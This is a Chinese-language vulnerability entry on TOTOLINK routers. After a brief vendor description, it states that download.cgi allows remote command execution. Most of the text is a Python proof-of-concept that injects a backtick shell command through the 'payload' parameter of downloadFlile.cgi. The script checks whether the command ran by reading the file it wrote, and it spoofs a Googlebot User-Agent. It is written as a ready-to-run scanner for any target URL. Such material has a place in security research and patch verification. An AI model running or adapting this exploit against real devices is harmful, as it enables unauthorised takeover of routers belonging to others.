服务简介

TOTOLINK是亚太区中高端无线路由第一品牌，由深圳众唐科技有限公司负责产品的研发、制造与中国地区市场销售，其产品线覆盖：无线／有线路由器、交换机、集线器、笔记本及PCI网卡和各种USB外设等相关产品。 

漏洞描述

TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限

POC

import requests
import urllib.request
import urllib.error
import sys
from colorama import init,Fore
import random

headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
}

def name():
    filename = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    a = random.sample(base_str, 5)
    for s in a:
        filename += s

    return filename

def poc(url):
    filename = name()
    payload = "/cgi-bin/downloadFlile.cgi?payload=`ls>../" + filename + ".txt`"
    try:
        try:
            responce_url = urllib.request.Request(url=url + payload, headers=headers, method='GET')
            responce = urllib.request.urlopen(responce_url, timeout=5)
            responce_text = requests.get(url=url + "/" + filename + ".txt", headers=headers, verify=False, timeout=5,
                                         allow_redirects=False)
            if responce.getcode() == 200 and 'cgi' in responce_text.text:
                print(Fore.GREEN+"存在漏洞:{}".format(url+'/'+filename+'.txt'))
                print(responce_text.text)
            else:
                print("不存在漏洞:{}".format(url))
        except urllib.error.HTTPError as e:
            responce_text = requests.get(url=url + "/" + filename + ".txt", headers=headers, verify=False,
                                         timeout=5, allow_redirects=False)
            if e.code == 500 and 'cgi' in responce_text.text:
                print(Fore.GREEN + "存在漏洞:{}".format(url + '/' + filename + '.txt'))
                print(responce_text.text)
            else:
                print("不存在漏洞:{}".format(url))
    except:
        print(Fore.RED+"连接失败:{}".format(url))


if __name__ == '__main__':
    init(autoreset=True)
    if(len(sys.argv) != 2):
        print("正确用法:python3 xxx.py url")
    else:
        url=sys.argv[1].strip('/')
        poc(url)
